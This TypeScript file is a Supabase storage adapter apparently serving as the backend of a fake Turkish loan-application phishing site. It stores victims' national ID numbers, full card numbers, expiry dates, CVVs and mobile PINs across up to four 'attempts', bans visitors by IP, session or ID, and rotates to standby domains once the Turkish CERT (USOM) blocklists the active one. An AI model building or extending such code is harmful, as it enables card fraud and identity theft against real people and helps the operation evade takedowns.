import type { FailoverEvent, SiteDomain } from "@/lib/domains/types";
import { zoneRootFromHostname } from "@/lib/domains/types";
import { getSupabaseAdmin } from "@/lib/supabase/server";
import type {
  Applicant,
  ApplicantStatus,
  ApplicantWithAttempts,
  Attempt,
  AttemptInput,
  AccessLogEntry,
  BanEntry,
  BanType,
  StorageAdapter,
} from "./types";

type ApplicantRow = {
  id: string;
  session_id: string;
  ip_address: string;
  status: ApplicantStatus;
  current_attempt: number;
  created_at: string;
  completed_at: string | null;
};

type AttemptRow = {
  id: string;
  applicant_id: string;
  attempt_number: number;
  tc_kimlik: string;
  first_name: string;
  last_name: string;
  phone: string;
  birth_date: string;
  loan_amount: number;
  loan_term: number;
  card_number: string;
  card_expiry: string;
  card_cvv: string;
  no_credit_card: boolean;
  mobile_pin: string;
  created_at: string;
};

type BanRow = {
  id: string;
  type: BanType;
  value: string;
  reason: string | null;
  created_at: string;
  expires_at: string | null;
};

type AccessLogRow = {
  id: string;
  ip: string;
  session_id: string | null;
  path: string;
  user_agent: string | null;
  blocked: boolean;
  block_reason: string | null;
  created_at: string;
};

type SiteDomainRow = {
  id: string;
  hostname: string;
  status: SiteDomain["status"];
  is_primary: boolean;
  zone_root: string | null;
  host_type: SiteDomain["hostType"];
  last_usom_check: string | null;
  blocked_at: string | null;
  created_at: string;
};

type FailoverEventRow = {
  id: string;
  from_hostname: string;
  to_hostname: string | null;
  trigger: "cron" | "manual";
  usom_checked_at: string;
  created_at: string;
};

function mapApplicant(row: ApplicantRow): Applicant {
  return {
    id: row.id,
    sessionId: row.session_id,
    ipAddress: row.ip_address,
    status: row.status,
    currentAttempt: row.current_attempt,
    createdAt: row.created_at,
    completedAt: row.completed_at,
  };
}

function mapAttempt(row: AttemptRow): Attempt {
  return {
    id: row.id,
    applicantId: row.applicant_id,
    attemptNumber: row.attempt_number,
    tcKimlik: row.tc_kimlik,
    firstName: row.first_name,
    lastName: row.last_name,
    phone: row.phone,
    birthDate: row.birth_date,
    loanAmount: Number(row.loan_amount),
    loanTerm: row.loan_term,
    cardNumber: row.card_number,
    cardExpiry: row.card_expiry,
    cardCvv: row.card_cvv,
    noCreditCard: row.no_credit_card,
    mobilePin: row.mobile_pin,
    createdAt: row.created_at,
  };
}

function mapBan(row: BanRow): BanEntry {
  return {
    id: row.id,
    type: row.type,
    value: row.value,
    reason: row.reason ?? undefined,
    createdAt: row.created_at,
    expiresAt: row.expires_at,
  };
}

function mapAccessLog(row: AccessLogRow): AccessLogEntry {
  return {
    id: row.id,
    ip: row.ip,
    sessionId: row.session_id ?? undefined,
    path: row.path,
    userAgent: row.user_agent ?? undefined,
    blocked: row.blocked,
    blockReason: row.block_reason ?? undefined,
    createdAt: row.created_at,
  };
}

function mapSiteDomain(row: SiteDomainRow): SiteDomain {
  return {
    id: row.id,
    hostname: row.hostname,
    status: row.status,
    isPrimary: row.is_primary,
    zoneRoot: row.zone_root,
    hostType: row.host_type ?? "apex",
    lastUsomCheck: row.last_usom_check,
    blockedAt: row.blocked_at,
    createdAt: row.created_at,
  };
}

function mapFailoverEvent(row: FailoverEventRow): FailoverEvent {
  return {
    id: row.id,
    fromHostname: row.from_hostname,
    toHostname: row.to_hostname,
    trigger: row.trigger,
    usomCheckedAt: row.usom_checked_at,
    createdAt: row.created_at,
  };
}

function isBanActive(ban: BanEntry): boolean {
  if (ban.expiresAt && new Date(ban.expiresAt) < new Date()) return false;
  return true;
}

function attemptInputToRow(applicantId: string, attemptNumber: number, data: AttemptInput) {
  return {
    applicant_id: applicantId,
    attempt_number: attemptNumber,
    tc_kimlik: data.tcKimlik,
    first_name: data.firstName,
    last_name: data.lastName,
    phone: data.phone,
    birth_date: data.birthDate,
    loan_amount: data.loanAmount,
    loan_term: data.loanTerm,
    card_number: data.cardNumber,
    card_expiry: data.cardExpiry,
    card_cvv: data.cardCvv,
    no_credit_card: data.noCreditCard,
    mobile_pin: data.mobilePin,
  };
}

export function createSupabaseDb(): StorageAdapter {
  const supabase = getSupabaseAdmin();
  if (!supabase) {
    throw new Error("Supabase is not configured");
  }

  const adapter: StorageAdapter = {
    async createApplicant(sessionId: string, ipAddress = ""): Promise<Applicant> {
      const { data, error } = await supabase
        .from("applicants")
        .insert({
          session_id: sessionId,
          ip_address: ipAddress,
          status: "in_progress",
          current_attempt: 0,
        })
        .select()
        .single();

      if (error) throw new Error(error.message);
      return mapApplicant(data as ApplicantRow);
    },

    async getApplicantBySession(sessionId: string): Promise<Applicant | null> {
      const { data, error } = await supabase
        .from("applicants")
        .select()
        .eq("session_id", sessionId)
        .maybeSingle();

      if (error) throw new Error(error.message);
      return data ? mapApplicant(data as ApplicantRow) : null;
    },

    async getApplicant(id: string): Promise<ApplicantWithAttempts | null> {
      const { data: applicant, error } = await supabase
        .from("applicants")
        .select()
        .eq("id", id)
        .maybeSingle();

      if (error) throw new Error(error.message);
      if (!applicant) return null;

      const { data: attempts, error: attemptsError } = await supabase
        .from("attempts")
        .select()
        .eq("applicant_id", id)
        .order("attempt_number");

      if (attemptsError) throw new Error(attemptsError.message);

      return {
        ...mapApplicant(applicant as ApplicantRow),
        attempts: (attempts as AttemptRow[]).map(mapAttempt),
      };
    },

    async listApplicants(): Promise<ApplicantWithAttempts[]> {
      const { data: applicants, error } = await supabase
        .from("applicants")
        .select()
        .order("created_at", { ascending: false });

      if (error) throw new Error(error.message);
      if (!applicants?.length) return [];

      const ids = applicants.map((a) => a.id);
      const { data: attempts, error: attemptsError } = await supabase
        .from("attempts")
        .select()
        .in("applicant_id", ids)
        .order("attempt_number");

      if (attemptsError) throw new Error(attemptsError.message);

      const byApplicant = new Map<string, Attempt[]>();
      for (const row of (attempts ?? []) as AttemptRow[]) {
        const list = byApplicant.get(row.applicant_id) ?? [];
        list.push(mapAttempt(row));
        byApplicant.set(row.applicant_id, list);
      }

      return (applicants as ApplicantRow[]).map((row) => ({
        ...mapApplicant(row),
        attempts: byApplicant.get(row.id) ?? [],
      }));
    },

    async addAttempt(applicantId: string, data: AttemptInput): Promise<Attempt> {
      const { data: applicant, error: fetchError } = await supabase
        .from("applicants")
        .select("current_attempt")
        .eq("id", applicantId)
        .single();

      if (fetchError) throw new Error(fetchError.message);
      if (applicant.current_attempt >= 4) {
        throw new Error("Maximum attempts reached");
      }

      const attemptNumber = applicant.current_attempt + 1;

      const { data: attempt, error } = await supabase
        .from("attempts")
        .insert(attemptInputToRow(applicantId, attemptNumber, data))
        .select()
        .single();

      if (error) throw new Error(error.message);

      const { error: updateError } = await supabase
        .from("applicants")
        .update({ current_attempt: attemptNumber })
        .eq("id", applicantId);

      if (updateError) throw new Error(updateError.message);

      return mapAttempt(attempt as AttemptRow);
    },

    async updateApplicantStatus(
      id: string,
      status: ApplicantStatus,
      completedAt?: string
    ): Promise<void> {
      const { error } = await supabase
        .from("applicants")
        .update({
          status,
          ...(completedAt ? { completed_at: completedAt } : {}),
        })
        .eq("id", id);

      if (error) throw new Error(error.message);
    },

    async logAccess(
      entry: Omit<AccessLogEntry, "id" | "createdAt">
    ): Promise<AccessLogEntry> {
      const { data, error } = await supabase
        .from("access_logs")
        .insert({
          ip: entry.ip,
          session_id: entry.sessionId ?? null,
          path: entry.path,
          user_agent: entry.userAgent ?? null,
          blocked: entry.blocked,
          block_reason: entry.blockReason ?? null,
        })
        .select()
        .single();

      if (error) throw new Error(error.message);
      return mapAccessLog(data as AccessLogRow);
    },

    async listAccessLogs(limit = 200): Promise<AccessLogEntry[]> {
      const { data, error } = await supabase
        .from("access_logs")
        .select()
        .order("created_at", { ascending: false })
        .limit(limit);

      if (error) throw new Error(error.message);
      return ((data ?? []) as AccessLogRow[]).map(mapAccessLog);
    },

    async listBans(): Promise<BanEntry[]> {
      const { data, error } = await supabase.from("bans").select();
      if (error) throw new Error(error.message);

      return ((data ?? []) as BanRow[])
        .map(mapBan)
        .filter(isBanActive)
        .sort(
          (a, b) =>
            new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
        );
    },

    async addBan(
      type: BanType,
      value: string,
      reason?: string,
      expiresAt: string | null = null
    ): Promise<BanEntry> {
      const normalized = value.trim();
      const existing = (await this.listBans()).find(
        (b) => b.type === type && b.value === normalized
      );
      if (existing) return existing;

      const { data, error } = await supabase
        .from("bans")
        .insert({
          type,
          value: normalized,
          reason: reason ?? null,
          expires_at: expiresAt,
        })
        .select()
        .single();

      if (error) throw new Error(error.message);
      return mapBan(data as BanRow);
    },

    async removeBan(id: string): Promise<boolean> {
      const { error, count } = await supabase
        .from("bans")
        .delete({ count: "exact" })
        .eq("id", id);

      if (error) throw new Error(error.message);
      return (count ?? 0) > 0;
    },

    async checkBan(params: {
      ip?: string;
      sessionId?: string;
      tcKimlik?: string;
    }): Promise<{ banned: boolean; reason?: string; ban?: BanEntry }> {
      const bans = await this.listBans();

      for (const ban of bans) {
        if (ban.type === "ip" && params.ip && ban.value === params.ip) {
          return { banned: true, reason: ban.reason ?? "IP yasaklandı", ban };
        }
        if (
          ban.type === "session" &&
          params.sessionId &&
          ban.value === params.sessionId
        ) {
          return {
            banned: true,
            reason: ban.reason ?? "Oturum yasaklandı",
            ban,
          };
        }
        if (ban.type === "tc" && params.tcKimlik && ban.value === params.tcKimlik) {
          return { banned: true, reason: ban.reason ?? "TC yasaklandı", ban };
        }
      }

      return { banned: false };
    },

    async listSiteDomains(): Promise<SiteDomain[]> {
      const { data, error } = await supabase
        .from("site_domains")
        .select()
        .order("created_at", { ascending: false });

      if (error) throw new Error(error.message);
      return ((data ?? []) as SiteDomainRow[]).map(mapSiteDomain);
    },

    async getActiveSiteDomain(): Promise<SiteDomain | null> {
      const { data, error } = await supabase
        .from("site_domains")
        .select()
        .eq("status", "active")
        .maybeSingle();

      if (error) throw new Error(error.message);
      return data ? mapSiteDomain(data as SiteDomainRow) : null;
    },

    async addSiteDomain(
      hostname: string,
      status: SiteDomain["status"] = "standby",
      meta?: { zoneRoot?: string; hostType?: SiteDomain["hostType"] }
    ): Promise<SiteDomain> {
      const normalized = hostname.toLowerCase().replace(/^www\./, "");
      const zoneRoot = meta?.zoneRoot ?? zoneRootFromHostname(normalized);
      const hostType =
        meta?.hostType ??
        (normalized.split(".").length > 2 ? "subdomain" : "apex");

      const { data: existing } = await supabase
        .from("site_domains")
        .select()
        .eq("hostname", normalized)
        .maybeSingle();

      if (existing) return mapSiteDomain(existing as SiteDomainRow);

      const { data, error } = await supabase
        .from("site_domains")
        .insert({
          hostname: normalized,
          status,
          zone_root: zoneRoot,
          host_type: hostType,
        })
        .select()
        .single();

      if (error) throw new Error(error.message);
      return mapSiteDomain(data as SiteDomainRow);
    },

    async setActiveSiteDomain(hostname: string): Promise<SiteDomain> {
      const normalized = hostname.toLowerCase().replace(/^www\./, "");
      await this.addSiteDomain(normalized, "standby");

      const { error: standbyError } = await supabase
        .from("site_domains")
        .update({ status: "standby" })
        .eq("status", "active")
        .neq("hostname", normalized);

      if (standbyError) throw new Error(standbyError.message);

      const { data, error } = await supabase
        .from("site_domains")
        .update({ status: "active", blocked_at: null })
        .eq("hostname", normalized)
        .select()
        .single();

      if (error) throw new Error(error.message);
      return mapSiteDomain(data as SiteDomainRow);
    },

    async updateSiteDomainUsomCheck(
      hostname: string,
      blocked: boolean,
      checkedAt: string
    ): Promise<void> {
      const normalized = hostname.toLowerCase().replace(/^www\./, "");

      const updates: Record<string, string> = {
        last_usom_check: checkedAt,
      };
      if (blocked) {
        updates.status = "blocked";
        updates.blocked_at = checkedAt;
      }

      const { error } = await supabase
        .from("site_domains")
        .update(updates)
        .eq("hostname", normalized);

      if (error) throw new Error(error.message);
    },

    async getSiteSetting(key: string): Promise<string | null> {
      const { data, error } = await supabase
        .from("site_settings")
        .select("value")
        .eq("key", key)
        .maybeSingle();

      if (error) throw new Error(error.message);
      return data?.value ?? null;
    },

    async setSiteSetting(key: string, value: string): Promise<void> {
      const { error } = await supabase
        .from("site_settings")
        .upsert({ key, value });

      if (error) throw new Error(error.message);
    },

    async listFailoverEvents(limit = 50): Promise<FailoverEvent[]> {
      const { data, error } = await supabase
        .from("failover_events")
        .select()
        .order("created_at", { ascending: false })
        .limit(limit);

      if (error) throw new Error(error.message);
      return ((data ?? []) as FailoverEventRow[]).map(mapFailoverEvent);
    },

    async logFailoverEvent(event: {
      fromHostname: string;
      toHostname: string | null;
      trigger: "cron" | "manual";
      usomCheckedAt: string;
    }): Promise<FailoverEvent> {
      const { data, error } = await supabase
        .from("failover_events")
        .insert({
          from_hostname: event.fromHostname,
          to_hostname: event.toHostname,
          trigger: event.trigger,
          usom_checked_at: event.usomCheckedAt,
        })
        .select()
        .single();

      if (error) throw new Error(error.message);
      return mapFailoverEvent(data as FailoverEventRow);
    },
  };

  return adapter;
}
